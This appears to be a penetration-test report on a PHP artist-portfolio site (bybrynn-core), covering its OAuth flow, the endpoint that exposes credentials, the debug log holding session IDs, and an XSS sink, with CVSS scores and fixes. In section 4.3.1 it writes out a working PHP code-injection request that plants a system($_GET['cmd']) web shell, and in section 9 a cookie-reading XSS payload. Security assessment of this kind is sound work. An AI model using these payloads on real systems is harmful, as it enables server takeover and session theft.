# Penetration Test Scope & Boundaries

## 1. Executive Summary

This document provides a comprehensive security analysis of the bybrynn-core web application, an artist portfolio and submission management system. The application is built using PHP, JavaScript, and utilizes Microsoft OAuth2 for authentication.

### Critical Findings Overview

The assessment identified **5 critical vulnerabilities** and multiple high-severity security issues:

1. **Critical: PHP Code Injection** - Remote code execution via unsanitized `$date` parameter in submissions.php (Line 129, 236)
2. **Critical: OAuth Credential Exposure** - Publicly accessible endpoint exposing OAuth client credentials in env.php
3. **Critical: Session Hijacking** - Session IDs and sensitive data logged to world-readable admin_debug.log
4. **Critical: Cross-Site Scripting (XSS)** - DOM-based XSS via innerHTML sink in art-renders.js (Line 23)
5. **Critical: Authentication Bypass** - POST handler processes submissions without verifying OAuth authentication state

### Risk Assessment

**Overall Risk Level: CRITICAL**

The application contains multiple pathways for complete system compromise, unauthorized access to sensitive credentials, and potential takeover of user accounts. Immediate remediation is required before production deployment.

## 2. Architecture & Technology Stack

### 2.1 Application Overview

**Application Name:** bybrynn-core
**Primary Purpose:** Artist portfolio website with authenticated artwork submission functionality
**Domain:** bybrynn.com (with Tor onion service support)

### 2.2 Technology Stack

#### Backend
- **Language:** PHP 7.x/8.x
- **Web Server:** Apache/Nginx (inferred from .php extensions)
- **Session Management:** PHP native sessions with custom cookie parameters
- **Image Processing:** PHP GD Library (libgd)

#### Frontend
- **Languages:** HTML5, JavaScript (ES6+)
- **Frameworks:** Bootstrap CSS
- **External Libraries:**
  - Ionicons 7.1.0 (icon library)
  - Isotope 3.0.6 (gallery layout/filtering)
  - Google Fonts (Libre Baskerville)

#### Dependencies (composer.json)
```json
{
    "require": {
        "league/oauth2-client": "^2.8",
        "stevenmaguire/oauth2-microsoft": "^2.2"
    }
}
```

Additionally includes Guzzle HTTP client stack:
- guzzlehttp/guzzle
- guzzlehttp/psr7
- guzzlehttp/promises

### 2.3 Directory Structure

```
/repos/bybrynn-core/
├── art/
│   ├── index.php (gallery listing)
│   ├── page.html (individual artwork display)
│   ├── entries.json (artwork metadata database)
│   └── images/ (artwork storage)
│       └── thumb/ (generated thumbnails)
├── jsrepo/
│   ├── art-renders.js (XSS vulnerability)
│   ├── gallery_sorter.js
│   ├── touch_dropdown.js
│   └── fade.js
├── shop/ (multiple product pages)
├── photography/
├── about/
├── commissions/
├── vendor/ (Composer dependencies)
├── submissions.php (main submission handler - CRITICAL VULN)
├── env.php (credential exposure - CRITICAL VULN)
├── info.php (phpinfo disclosure)
├── thumb.php (thumbnail generation library)
└── admin_debug.log (session hijacking vector)
```

### 2.4 Network Architecture

- **Primary Domain:** https://bybrynn.com
- **Onion Service:** http://artbybryndkmgb6ach4uqhrhsfkqbtcf3vrptfkljhclc3bxk74giwid.onion
- **CDN/External Resources:**
  - fonts.googleapis.com (Google Fonts)
  - unpkg.com (Ionicons CDN)
  - cdn.jsdelivr.net (Isotope library)

## 3. Authentication & Authorization Deep Dive

### 3.1 Authentication Mechanism

The application implements **Microsoft Azure AD OAuth 2.0** authentication via the authorization code flow.

#### OAuth Configuration (submissions.php lines 28-44)
```php
$clientId     = getenv('MICROSOFT_OAUTH_CLIENT_ID');
$clientSecret = getenv('MICROSOFT_OAUTH_CLIENT_SECRET');
$tenantId     = 'cd47551c-33c7-4b7f-87a9-df19f9169121';
$redirectUri  = 'https://bybrynn.com/submissions';

$provider = new Microsoft([
    'clientId'                => $clientId,
    'clientSecret'            => $clientSecret,
    'redirectUri'             => $redirectUri,
    'urlAuthorize'            => "https://login.microsoftonline.com/{$tenantId}/oauth2/v2.0/authorize",
    'urlAccessToken'          => "https://login.microsoftonline.com/{$tenantId}/oauth2/v2.0/token",
    'urlResourceOwnerDetails' => 'https://graph.microsoft.com/oidc/userinfo',
]);
```

**Tenant ID:** cd47551c-33c7-4b7f-87a9-df19f9169121 (hardcoded)
**Scope:** User.Read
**Prompt:** select_account

### 3.2 Authentication Flow

1. **Initial Request (GET):** User accesses /submissions
2. **OAuth State Generation:** Server generates and stores state token in $_SESSION['oauth2state']
3. **Redirect to Microsoft:** User redirected to Microsoft login
4. **Callback Processing:** Microsoft redirects back with authorization code
5. **State Validation:** Server validates state parameter (lines 60-63)
6. **Token Exchange:** Authorization code exchanged for access token (lines 65-71)
7. **User Info Retrieval:** Access token used to fetch user details (lines 73-76)

### 3.3 Critical Authentication Vulnerabilities

#### 3.3.1 Authentication Bypass (CRITICAL)

**Location:** /repos/bybrynn-core/submissions.php, lines 121-253

**Issue:** The POST handler that processes artwork submissions is placed **after** the OAuth flow logic, but the OAuth logic only executes for GET requests:

```php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    // ... OAuth authentication logic ...
}

// ... Later in file ...

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // ... Process submission WITHOUT checking authentication ...
}
```

**Impact:** Any unauthenticated user can submit POST requests directly to /submissions and bypass the entire OAuth authentication flow. This allows:
- Unauthorized artwork uploads
- File system manipulation
- JSON database poisoning
- PHP file modification (index.php injection)

**CVSS 3.1 Score:** 9.1 (Critical)
**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H

#### 3.3.2 OAuth Credential Exposure (CRITICAL)

**Location:** /repos/bybrynn-core/env.php

**Full File Contents:**
```php
<?php
header('Content-Type: text/plain');
echo "MICROSOFT_OAUTH_CLIENT_ID=" . getenv('MICROSOFT_OAUTH_CLIENT_ID') . "\n";
echo "MICROSOFT_OAUTH_CLIENT_SECRET=" . getenv('MICROSOFT_OAUTH_CLIENT_SECRET') . "\n";
```

**Issue:** This file is publicly accessible via https://bybrynn.com/env.php and exposes:
- Microsoft OAuth Client ID
- Microsoft OAuth Client Secret

**Impact:**
- Complete OAuth flow compromise
- Ability to impersonate the application
- Potential to request tokens on behalf of users
- Access to Microsoft Graph API resources under the application's identity
- Session hijacking possibilities

**CVSS 3.1 Score:** 10.0 (Critical)
**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

#### 3.3.3 Session Hijacking via Debug Logging (CRITICAL)

**Location:** /repos/bybrynn-core/submissions.php, lines 14-21

```php
file_put_contents(
  __DIR__ . '/admin_debug.log',
  date('c') . " SESSION ID   : " . session_id() . "\n" .
  date('c') . " COOKIE ARRAY : " . print_r($_COOKIE, true) . "\n" .
  date('c') . " GET          : " . print_r($_GET, true) . "\n" .
  date('c') . " SESS         : " . print_r($_SESSION, true) . "\n\n",
  FILE_APPEND
);
```

**Issue:** Every request to submissions.php logs:
- Active session IDs
- Complete $_COOKIE array
- OAuth state tokens ($_SESSION['oauth2state'])
- All GET parameters including authorization codes
- Entire session data

The log file is written to document root as `admin_debug.log` with no access restrictions.

**Impact:**
- Direct session hijacking by obtaining valid session IDs
- OAuth state token theft enabling CSRF attacks
- Authorization code interception
- Cookie theft including potentially sensitive application cookies

**CVSS 3.1 Score:** 9.3 (Critical)
**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N

### 3.4 Session Security Configuration

**Location:** /repos/bybrynn-core/submissions.php, lines 3-10

```php
session_set_cookie_params([
  'lifetime' => 0,
  'path'     => '/',
  'domain'   => '.bybrynn.com',
  'secure'   => true,
  'httponly' => true,
  'samesite' => 'Lax',
]);
```

**Positive Security Controls:**
- ✅ Secure flag enabled (HTTPS only)
- ✅ HttpOnly flag enabled (XSS cookie theft mitigation)
- ✅ SameSite=Lax (partial CSRF protection)
- ✅ Subdomain sharing via .bybrynn.com

**Security Concerns:**
- ⚠️ Session lifetime of 0 (browser session only - no server-side timeout)
- ⚠️ SameSite=Lax (should be Strict for admin functionality)
- ⚠️ No explicit session regeneration after authentication

## 4. Data Security & Storage

### 4.1 Data Storage Architecture

#### 4.1.1 Artwork Metadata Storage

**File:** /repos/bybrynn-core/art/entries.json
**Format:** JSON key-value store
**Structure:**
```json
{
    "artworkSlug": {
        "subheading": "medium - dimensions - year",
        "metaTitle": "Art byBrynn - Title - Portfolio works",
        "title": "Title",
        "description": "Description text",
        "onion": "http://artbybryndkmgb6ach4uqhrhsfkqbtcf3vrptfkljhclc3bxk74giwid.onion/T/art/slug",
        "image": "/art/images/slug.webp",
        "secondary": "/art/images/slug-secondary.webp",
        "prev": "previousSlug",
        "next": "nextSlug"
    }
}
```

**Access Pattern:** Direct file read/write with LOCK_EX flag
**Vulnerabilities:** JSON injection, race conditions despite locking

#### 4.1.2 Image Storage

**Primary Directory:** /repos/bybrynn-core/art/images/
**Thumbnail Directory:** /repos/bybrynn-core/art/images/thumb/
**Supported Format:** WebP only (enforced)
**Naming Convention:** {slug}.webp, {slug}-secondary.webp
**Permissions:** 0755 (directories), default umask (files)

#### 4.1.3 Gallery Index Storage

**File:** /repos/bybrynn-core/art/index.php
**Purpose:** PHP template with embedded gallery data array
**Update Method:** String manipulation and file_put_contents()

### 4.2 Input Validation

#### 4.2.1 Submission Form Validation

**Location:** /repos/bybrynn-core/submissions.php, lines 124-134

```php
$title       = trim($_POST['title'] ?? '');
$medium      = trim($_POST['medium'] ?? '');
$dimensions  = trim($_POST['dimensions'] ?? '');
$year        = trim($_POST['year'] ?? '');
$description = trim($_POST['description'] ?? '');
$date        = $_POST['date'] ?? date('Y-m-d');

if (!$title || !$medium || !$dimensions || !$year) {
    respond('Error: Title, medium, dimensions, and year are required.');
}
```

**Validation Issues:**
- ❌ No maximum length validation
- ❌ No character encoding validation
- ❌ No HTML/script tag filtering
- ❌ **CRITICAL: No validation on $date parameter**
- ❌ No special character sanitization for filesystem operations

#### 4.2.2 File Upload Validation

**Location:** /repos/bybrynn-core/submissions.php, lines 142-163

```php
if (!empty($_FILES['highres']) && $_FILES['highres']['error'] === UPLOAD_ERR_OK) {
    if ($_FILES['highres']['type'] === 'image/webp') {
        $highName = "$slug.webp";
        $highDest = "$imagesDir/$highName";
        if (move_uploaded_file($_FILES['highres']['tmp_name'], $highDest)) {
            $highresPath = "/art/images/$highName";
        }
    }
}
```

**Validation Strengths:**
- ✅ MIME type validation (image/webp only)
- ✅ Uses move_uploaded_file() (proper upload handling)

**Validation Weaknesses:**
- ❌ Relies on client-provided MIME type ($_FILES['type']) without magic byte verification
- ❌ No file size limits
- ❌ No image dimension limits
- ❌ No verification that uploaded file is actually a valid WebP image
- ❌ No virus/malware scanning

### 4.3 Critical Data Security Vulnerabilities

#### 4.3.1 PHP Code Injection (CRITICAL)

**Location:** /repos/bybrynn-core/submissions.php, line 236

**Vulnerable Code:**
```php
$date = $_POST['date'] ?? date('Y-m-d');
// ... later ...
$block = "['slug' => '$slug', 'date' => '$date'],\n";

$newHtml = substr($html, 0, $pos)
         . $block
         . substr($html, $pos);

if (file_put_contents($indexFile, str_replace("\n", PHP_EOL, $newHtml)) === false) {
    respond('Error: Failed to update index.php');
}
```

**Issue:** The `$date` parameter from POST data is directly concatenated into a PHP array literal and written to index.php **without any escaping or validation**. The $slug is sanitized (line 136) but $date is not.

**Exploitation Example:**
```http
POST /submissions HTTP/1.1
Host: bybrynn.com
Content-Type: application/x-www-form-urlencoded

title=Test&medium=Oil&dimensions=10x10&year=2024&date=2024-01-01'],phpinfo();//
```

This would inject into index.php:
```php
['slug' => 'test', 'date' => '2024-01-01'],phpinfo();//'],
```

**Advanced Exploitation:**
```
date=2024-01-01'];system($_GET['cmd']);//
```

Results in RCE via:
```
https://bybrynn.com/art/?cmd=cat+/etc/passwd
```

**Impact:**
- **Remote Code Execution** as web server user
- Complete server compromise
- Database access
- Lateral movement to other systems
- Data exfiltration
- Website defacement
- Cryptominer installation
- Backdoor installation

**CVSS 3.1 Score:** 10.0 (Critical)
**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

#### 4.3.2 JSON Injection

**Location:** /repos/bybrynn-core/submissions.php, lines 177-187

```php
$newEntry = [
    'subheading'  => "$medium - $dimensions - $year",
    'metaTitle'   => "Art by Brynn - $title - Portfolio works",
    'title'       => $title,
    'description' => $description,
    'onion'       => "http://artbybryndkmgb6ach4uqhrhsfkqbtcf3vrptfkljhclc3bxk74giwid.onion/T/art/$slug",
    'image'       => $highresPath,
    'secondary'   => $secondaryPath,
    'prev'        => '',
    'next'        => ''
];
```

**Issue:** User-controlled data ($title, $description, $medium, $dimensions, $year) is placed into a PHP array and then JSON-encoded. While json_encode() does handle escaping, the **textual fallback path** (lines 207-223) manually constructs JSON without proper escaping:

```php
$frag = json_encode([$slug => $newEntry], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
$frag = trim($frag);
$frag = substr($frag, 1, -1);  // Removes outer braces
// ... appends to existing JSON file ...
$newRaw = $prefix . "\n" . $frag . "\n}";
```

If the file contains malformed JSON, this fallback activates. The JSON_UNESCAPED_SLASHES flag means slashes aren't escaped, enabling potential injection.

**Impact:**
- JSON structure manipulation
- XSS payload injection into metadata
- Data corruption
- Application logic bypass

**CVSS 3.1 Score:** 6.5 (Medium)
**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L

#### 4.3.3 Path Traversal (Mitigated)

**Location:** /repos/bybrynn-core/submissions.php, line 136

```php
$slug = preg_replace('/[^a-z0-9]/', '', strtolower($title));
```

**Analysis:** The slug generation removes all non-alphanumeric characters, effectively preventing path traversal attacks like:
- `../../etc/passwd`
- `.htaccess`

**Status:** ✅ Properly mitigated

### 4.4 Output Encoding

#### 4.4.1 Server-Side Output

**PHP Files:**
- ✅ Most output uses htmlspecialchars() (e.g., submissions.php line 91, art/index.php lines 161, 164)
- ✅ urlencode() used for URL parameters (art/index.php line 159)

#### 4.4.2 Client-Side Output (VULNERABLE)

**See Section 9: XSS Sinks and Render Contexts**

## 5. Attack Surface Analysis

### 5.1 Public Attack Surface

#### 5.1.1 Unauthenticated Endpoints

| Endpoint | Method | Purpose | Risk Level |
|----------|--------|---------|------------|
| /env.php | GET | **Credential Exposure** | CRITICAL |
| /info.php | GET | **phpinfo() disclosure** | CRITICAL |
| /submissions | POST | **Unauthenticated submission handler** | CRITICAL |
| /submissions | GET | OAuth initiation | MEDIUM |
| /art/index.php | GET | Gallery listing | LOW |
| /art/page.html | GET | Individual artwork | MEDIUM (XSS) |
| /art/entries.json | GET | Metadata API | LOW |
| /thumb.php | N/A | Library (not directly accessible) | N/A |
| /admin_debug.log | GET | **Session hijacking** | CRITICAL |

#### 5.1.2 Authentication-Required Endpoints

**Expected:** /submissions (POST)
**Actual:** NONE (authentication bypass vulnerability)

#### 5.1.3 Static Assets

- /jsrepo/*.js (JavaScript files)
- /cssrepo/*.css (CSS files)
- /art/images/*.webp (artwork images)
- /images/*.webp, *.png, *.ico (site assets)

### 5.2 Network Attack Surface

#### 5.2.1 External Dependencies

**Risk: Supply Chain Attacks**

External resources loaded from CDNs:
```html
<!-- Compromised CDN = XSS on all pages -->
<script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
<script src="https://cdn.jsdelivr.net/isotope/3.0.6/isotope.pkgd.min.js"></script>
```

**Mitigation:** None (no Subresource Integrity hashes)

#### 5.2.2 HTTP Request Smuggling

**Location:** /repos/bybrynn-core/vendor/guzzlehttp/

The application includes Guzzle HTTP client for OAuth communication. Potential for:
- SSRF (see Section 10)
- HTTP request smuggling if Guzzle version is outdated
- TLS validation bypass

### 5.3 File System Attack Surface

#### 5.3.1 Writable Locations

- ✍️ /art/entries.json (JSON database)
- ✍️ /art/index.php (PHP template - **RCE target**)
- ✍️ /art/images/*.webp (image uploads)
- ✍️ /art/images/thumb/*.webp (auto-generated thumbnails)
- ✍️ /admin_debug.log (debug output)

#### 5.3.2 World-Readable Sensitive Files

- 🔓 /admin_debug.log (session IDs, OAuth tokens)
- 🔓 /composer.json (dependency disclosure)
- 🔓 /art/entries.json (full metadata)

### 5.4 Third-Party Component Attack Surface

#### 5.4.1 Composer Dependencies

```
league/oauth2-client: ^2.8
stevenmaguire/oauth2-microsoft: ^2.2
guzzlehttp/guzzle: (transitive)
guzzlehttp/psr7: (transitive)
guzzlehttp/promises: (transitive)
```

**Risks:**
- Outdated dependencies with known CVEs
- OAuth implementation vulnerabilities
- HTTP client vulnerabilities (SSRF, etc.)

**Recommended Action:** Run `composer audit` to check for known vulnerabilities

#### 5.4.2 Frontend Libraries

```javascript
// CDN-hosted - no version pinning or SRI
ionicons@7.1.0
isotope@3.0.6
```

### 5.5 Information Disclosure Attack Surface

#### 5.5.1 phpinfo() Disclosure (CRITICAL)

**Location:** /repos/bybrynn-core/info.php

```php
<?php
phpinfo();
```

**Accessible at:** https://bybrynn.com/info.php

**Disclosed Information:**
- PHP version and modules
- Server software and version
- Document root and file paths
- Environment variables (potentially including secrets)
- PHP configuration (memory limits, file upload limits, etc.)
- Loaded extensions
- Database connection details (if displayed)

**Impact:**
- Complete server fingerprinting
- Exposure of internal paths for targeted attacks
- Credential leakage if stored in environment
- Version-specific exploit targeting

**CVSS 3.1 Score:** 7.5 (High)
**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

#### 5.5.2 Debug Error Messages

**Location:** /repos/bybrynn-core/submissions.php, lines 80-82

```php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
```

**Also in:** /repos/bybrynn-core/art/index.php, lines 2-4

**Impact:**
- Stack traces reveal file paths
- Database errors expose schema information
- Include errors reveal directory structure
- Error-based SQL injection amplification

#### 5.5.3 Verbose Logging

**Location:** submissions.php logs extensive debugging information:

```php
function logd($msg) {
    global $debugLog;
    file_put_contents($debugLog, date('c') . ' ' . $msg . PHP_EOL, FILE_APPEND);
}
```

Logs include:
- All input parameters
- File operation results
- JSON parsing states
- SQL-like operations

If admin_debug.log is accessible, complete application state is exposed.

## 6. Infrastructure & Operational Security

### 6.1 Web Server Configuration

**Inferred Configuration:**
- PHP execution enabled in document root
- .log files not blocked from web access
- .json files publicly readable
- No .htaccess restrictions on sensitive files

**Missing Security Headers:**

Based on code analysis, likely missing:
- X-Frame-Options
- X-Content-Type-Options
- Content-Security-Policy
- Strict-Transport-Security
- X-XSS-Protection (deprecated but still useful)
- Referrer-Policy
- Permissions-Policy

### 6.2 HTTPS/TLS Configuration

**Positive Indicators:**
- Secure cookie flag set to true
- All hardcoded URLs use https://

**Unknown/Untested:**
- TLS version enforcement
- Cipher suite strength
- Certificate validation
- HSTS header presence

### 6.3 Deployment Security

**Security Concerns:**

1. **Vendor directory publicly accessible:**
   - /vendor/ should be outside document root or blocked via .htaccess
   - Exposes dependency versions for targeted attacks
   - Contains test files with mock credentials

2. **No .htaccess security rules:**
   - .log files accessible
   - .json files accessible
   - No IP whitelisting for admin functions

3. **Debug mode enabled in production:**
   - display_errors=1 reveals internal errors
   - Extensive logging to accessible file

### 6.4 Tor Hidden Service

**Onion Address:** http://artbybryndkmgb6ach4uqhrhsfkqbtcf3vrptfkljhclc3bxk74giwid.onion

**Security Implications:**
- Provides anonymity for visitors
- HTTPS not required (onion encryption)
- May bypass geo-restrictions
- Harder to take down
- Same vulnerabilities apply

## 7. Overall Codebase Indexing

### 7.1 Core Application Files

#### Authentication & Session Management
- **/repos/bybrynn-core/submissions.php** (256 lines)
  - Lines 3-12: Session configuration
  - Lines 14-21: Debug logging (session hijacking vuln)
  - Lines 27-77: OAuth flow implementation
  - Lines 80-93: Error handling setup
  - Lines 121-253: POST handler (code injection vuln)

#### Content Management
- **/repos/bybrynn-core/art/index.php** (195 lines)
  - Lines 99-152: Artwork array (injection target)
  - Lines 154-167: Gallery rendering loop
  - Uses thumb.php for image processing

- **/repos/bybrynn-core/thumb.php** (67 lines)
  - Image thumbnail generation using GD
  - No security vulnerabilities identified

#### Data Storage
- **/repos/bybrynn-core/art/entries.json** (~2000 lines estimated)
  - JSON key-value store for artwork metadata
  - Read/written by submissions.php

#### Credential Exposure
- **/repos/bybrynn-core/env.php** (5 lines)
  - **CRITICAL:** Exposes OAuth credentials

#### Information Disclosure
- **/repos/bybrynn-core/info.php** (3 lines)
  - **CRITICAL:** phpinfo() disclosure

### 7.2 Frontend Files

#### JavaScript Files

**Location:** /repos/bybrynn-core/jsrepo/

1. **art-renders.js** (40 lines) - **VULNERABLE**
   - Line 7: Fetches /art/entries.json
   - Line 23: **XSS SINK** - innerHTML injection
   - Lines 13-20: Safe DOM manipulation
   - Lines 36-37: Safe attribute assignment

2. **gallery_sorter.js** (93 lines)
   - Line 24: innerHTML with controlled content (low risk)
   - Sorting and filtering logic
   - No critical vulnerabilities

3. **touch_dropdown.js**
   - Dropdown menu interaction
   - Not analyzed in detail

4. **fade.js**
   - Page transition effects
   - Not analyzed in detail

#### HTML Files

**Location:** /repos/bybrynn-core/

- **/art/page.html** (106 lines)
  - Lines 21: Loads art-renders.js (XSS vulnerability)
  - Lines 33-48: Secondary image loader
  - Client-side rendering via JavaScript

- **/index.html** - Landing page
- **/about/index.html** - About page
- **/commissions/index.html** - Commissions page
- **/shop/index.html** - Shop page
- **/shop/[product]/index.html** - Multiple product pages
- **/photography/index.html** - Photography portfolio

### 7.3 Dependencies

#### Composer Vendor Directory

**Location:** /repos/bybrynn-core/vendor/

**Key Packages:**

1. **league/oauth2-client** (Generic OAuth2 framework)
   - src/Provider/AbstractProvider.php - Main OAuth logic
   - src/Grant/ - Grant type implementations

2. **stevenmaguire/oauth2-microsoft** (Microsoft-specific)
   - src/Provider/Microsoft.php - Azure AD integration

3. **guzzlehttp/guzzle** (HTTP client)
   - src/Client.php - HTTP request handler
   - src/Handler/CurlHandler.php - Uses curl_exec()
   - **Potential SSRF vector**

4. **guzzlehttp/psr7** (PSR-7 implementation)
5. **guzzlehttp/promises** (Promises/A+ implementation)
6. **psr/http-message** (HTTP message interfaces)
7. **psr/http-client** (HTTP client interfaces)
8. **psr/http-factory** (HTTP factory interfaces)
9. **ralouphie/getallheaders** (Header utility)
10. **symfony/deprecation-contracts** (Deprecation helpers)

### 7.4 Configuration Files

- **/repos/bybrynn-core/composer.json** (6 lines)
  - Defines dependencies
- **/repos/bybrynn-core/vendor/composer/installed.json**
  - Locked dependency versions
- **No .env file found** (credentials via getenv())
- **No .htaccess file found** (security concern)

## 8. Critical File Paths

### 8.1 Files Containing Critical Vulnerabilities

| File Path | Vulnerability | Severity | Lines |
|-----------|--------------|----------|-------|
| /repos/bybrynn-core/submissions.php | PHP Code Injection (RCE) | CRITICAL | 129, 236 |
| /repos/bybrynn-core/submissions.php | Authentication Bypass | CRITICAL | 121-253 |
| /repos/bybrynn-core/submissions.php | Session Hijacking (logging) | CRITICAL | 14-21 |
| /repos/bybrynn-core/env.php | OAuth Credential Exposure | CRITICAL | 3-4 |
| /repos/bybrynn-core/info.php | phpinfo() Disclosure | CRITICAL | 2 |
| /repos/bybrynn-core/jsrepo/art-renders.js | DOM-based XSS | CRITICAL | 23 |
| /repos/bybrynn-core/submissions.php | Debug Mode Enabled | HIGH | 80-82 |
| /repos/bybrynn-core/art/index.php | Debug Mode Enabled | HIGH | 2-4 |
| /repos/bybrynn-core/jsrepo/gallery_sorter.js | Low-risk innerHTML | LOW | 24 |

### 8.2 Files Requiring Immediate Remediation

**Priority 1 (Production-Breaking):**
1. /repos/bybrynn-core/env.php - DELETE or move outside webroot
2. /repos/bybrynn-core/info.php - DELETE
3. /repos/bybrynn-core/submissions.php - Fix code injection (line 236)
4. /repos/bybrynn-core/submissions.php - Implement auth check in POST handler

**Priority 2 (High Risk):**
5. /repos/bybrynn-core/submissions.php - Remove debug logging (lines 14-21)
6. /repos/bybrynn-core/jsrepo/art-renders.js - Fix XSS (line 23)
7. /repos/bybrynn-core/submissions.php - Disable display_errors

### 8.3 Injection Target Files

These files are **written to by the application** and are targets for injection attacks:

1. **/repos/bybrynn-core/art/index.php**
   - Written by: submissions.php line 242
   - Injection: Code injection via $date parameter
   - Permissions: Must be writable by web server

2. **/repos/bybrynn-core/art/entries.json**
   - Written by: submissions.php lines 203, 220
   - Injection: JSON structure manipulation
   - Permissions: Must be writable by web server

3. **/repos/bybrynn-core/admin_debug.log**
   - Written by: submissions.php lines 14-21, 85-88
   - Exposure: Contains session IDs and sensitive data
   - Permissions: World-readable (security issue)

### 8.4 Sensitive Data Storage Paths

| Path | Contents | Web Accessible | Risk |
|------|----------|----------------|------|
| /repos/bybrynn-core/admin_debug.log | Session IDs, OAuth codes, cookies | YES (critical) | Session hijacking |
| /repos/bybrynn-core/art/entries.json | All artwork metadata | YES (low risk) | Data exposure |
| /repos/bybrynn-core/composer.json | Dependency list | YES (medium risk) | Version disclosure |
| /repos/bybrynn-core/vendor/ | Third-party code | YES (medium risk) | Vulnerability targeting |
| /repos/bybrynn-core/art/images/ | Uploaded artwork | YES (expected) | Storage exhaustion |

### 8.5 External Resource References

**Microsoft OAuth Endpoints (Trusted):**
- https://login.microsoftonline.com/cd47551c-33c7-4b7f-87a9-df19f9169121/oauth2/v2.0/authorize
- https://login.microsoftonline.com/cd47551c-33c7-4b7f-87a9-df19f9169121/oauth2/v2.0/token
- https://graph.microsoft.com/oidc/userinfo

**CDN Resources (Supply Chain Risk):**
- https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js
- https://cdn.jsdelivr.net/isotope/3.0.6/isotope.pkgd.min.js
- https://fonts.googleapis.com/css2?family=Libre+Baskerville&display=swap
- https://fonts.gstatic.com

## 9. XSS Sinks and Render Contexts

### 9.1 Client-Side XSS Vulnerabilities

#### 9.1.1 innerHTML Sink (CRITICAL)

**Location:** /repos/bybrynn-core/jsrepo/art-renders.js, line 23

**Vulnerable Code:**
```javascript
fetch(`/art/entries.json?cb=${Date.now()}`)
  .then(response => response.json())
  .then(data => {
    const entry = data[artId];
    if (!entry) return;

    // CRITICAL XSS SINK
    document.getElementById("art-subheading").innerHTML = `<a>${entry.subheading}</a>`;
  });
```

**Data Flow:**
1. User submits artwork with malicious payload in medium/dimensions/year fields
2. Payload stored in entries.json as part of subheading: `"${medium} - ${dimensions} - ${year}"`
3. Client-side JavaScript fetches entries.json
4. Malicious subheading injected into DOM via innerHTML

**Exploitation Example:**

Submit artwork with:
```
medium: <img src=x onerror=alert(document.cookie)>
dimensions: 10x10
year: 2024
```

Results in entries.json:
```json
"subheading": "<img src=x onerror=alert(document.cookie)> - 10x10 - 2024"
```

When page loads:
```javascript
document.getElementById("art-subheading").innerHTML =
  `<a><img src=x onerror=alert(document.cookie)> - 10x10 - 2024</a>`;
```

**Impact:**
- Cookie theft (session hijacking)
- Keylogging
- Credential harvesting
- Drive-by downloads
- Website defacement
- Cryptocurrency mining
- OAuth token theft

**CVSS 3.1 Score:** 8.2 (High)
**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N

**Context:** Stored XSS (persists in database)

#### 9.1.2 innerHTML Sink (Low Risk)

**Location:** /repos/bybrynn-core/jsrepo/gallery_sorter.js, line 24

**Code:**
```javascript
function sortBy(option) {
    let closeOutline = "close-outline";
    selectedOptionElement.innerHTML = `${option} <ion-icon name="${closeOutline}"></ion-icon>`;
}
```

**Analysis:**
- `option` parameter comes from onclick handlers with hardcoded values: "Name", "Newest", "Oldest"
- No user input directly controls this value
- closeOutline is a hardcoded string

**Risk Level:** LOW (attacker cannot control the option parameter)

### 9.2 Safe DOM Manipulation Patterns

The following patterns in the codebase correctly avoid XSS:

#### 9.2.1 textContent Usage (Safe)

**Location:** /repos/bybrynn-core/jsrepo/art-renders.js

```javascript
// ✅ Safe - uses textContent instead of innerHTML
document.title = entry.metaTitle;
document.getElementById("meta-title").textContent = entry.metaTitle;
document.getElementById("art-title").textContent = entry.title;
document.getElementById("art-description").textContent = entry.description;
```

#### 9.2.2 setAttribute Usage (Safe)

```javascript
// ✅ Safe - sets attribute, not HTML content
document.getElementById("meta-desc").setAttribute("content", entry.description);
document.getElementById("og-title").setAttribute("content", entry.metaTitle);
document.getElementById("art-image").src = entry.image;
document.getElementById("prev-link").href = `/art/page.html?art=${entry.prev}`;
```

#### 9.2.3 createElement + appendChild (Safe)

```javascript
// ✅ Safe - creates element programmatically
const img = document.createElement('img');
img.src = entry.secondary;
img.alt = '';
img.loading = 'lazy';
secContainer.appendChild(img);
```

### 9.3 Server-Side XSS Prevention

#### 9.3.1 PHP htmlspecialchars() Usage

**Location:** /repos/bybrynn-core/art/index.php

```php
// ✅ Safe output encoding
<img
  src="<?= htmlspecialchars($thumbUrl) ?>"
  alt="<?= htmlspecialchars($item['slug']) ?>">
```

**Location:** /repos/bybrynn-core/submissions.php, line 91

```php
// ✅ Safe output
echo '<p>' . htmlspecialchars($msg) . '</p>';
```

### 9.4 XSS Attack Vectors Summary

| Vector | Sink | Source | Status | Severity |
|--------|------|--------|--------|----------|
| Stored XSS | innerHTML (art-renders.js:23) | entries.json (subheading) | VULNERABLE | CRITICAL |
| Stored XSS | innerHTML (art-renders.js:23) | $_POST['medium'] | VULNERABLE | CRITICAL |
| Stored XSS | innerHTML (art-renders.js:23) | $_POST['dimensions'] | VULNERABLE | CRITICAL |
| Stored XSS | innerHTML (art-renders.js:23) | $_POST['year'] | VULNERABLE | CRITICAL |
| Reflected XSS | N/A | URL parameters | SAFE | N/A |
| DOM XSS | innerHTML (gallery_sorter.js:24) | Hardcoded strings | SAFE | N/A |

### 9.5 Render Contexts

#### 9.5.1 HTML Context
- **Location:** art-renders.js line 23
- **Risk:** Full HTML injection including <script> tags
- **Mitigation:** Change innerHTML to textContent

#### 9.5.2 Attribute Context
- **Locations:** Multiple setAttribute() calls
- **Risk:** None (setAttribute properly escapes)

#### 9.5.3 JavaScript Context
- **Locations:** None identified
- **Risk:** N/A

#### 9.5.4 CSS Context
- **Locations:** None identified
- **Risk:** N/A

### 9.6 Content Security Policy

**Current Status:** No CSP headers detected in code

